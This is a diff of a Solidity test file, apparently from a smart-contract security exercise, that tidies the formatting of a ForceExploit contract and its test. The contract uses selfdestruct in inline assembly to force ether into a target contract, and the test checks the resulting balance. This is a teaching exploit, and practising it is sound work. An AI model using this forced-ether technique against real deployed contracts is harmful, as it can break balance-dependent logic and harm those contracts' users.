@@ -11,16 +11,15 @@ contract ForceExploit {
         force = _force;
     }
 
-
     function exploit() public {
         assembly {
             selfdestruct(sload(force.slot))
         }
     }
-    receive() external payable {
-        
-    }
+
+    receive() external payable {}
 }
+
 contract ForceTest is BaseTest {
     IForce public forceInstance = IForce(0x85115E3Bb9739dfDb3629e8f0539e1d013BF7678);
 
@@ -39,8 +38,7 @@ contract ForceTest is BaseTest {
         assertEq(address(forceInstance).balance, 1 ether);
     }
 
-    function exploitYul() internal override {   
-    }
+    function exploitYul() internal override {}
 
     function testExploitYul() public override {
         exploitYul();
